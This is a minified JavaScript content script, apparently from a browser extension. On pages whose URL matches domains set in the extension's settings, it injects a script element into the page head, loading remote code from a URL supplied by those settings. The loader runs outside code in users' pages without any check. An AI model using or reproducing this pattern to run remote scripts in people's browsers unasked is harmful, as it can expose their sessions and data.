!function(){var loadjs=function(a){if(!document.getElementById("inject")){var c=document.getElementsByTagName("head")[0],sc=document.createElement("script");sc.id="inject",sc.src=a,c.insertBefore(sc,c.firstChild)}};chrome.extension.sendMessage({type:"setting"}),chrome.extension.onMessage.addListener(function(request){if(request.domain)for(var i in request.domain)if(console.log(location.href,request.domain[i]),location.href.indexOf(request.domain[i])>-1){"no"==request.cache&&(request.inject=request.inject.indexOf("?")>-1?request.inject+"&rnd="+Math.random():request.inject+"?rnd="+Math.random()),loadjs(request.inject);break}})}();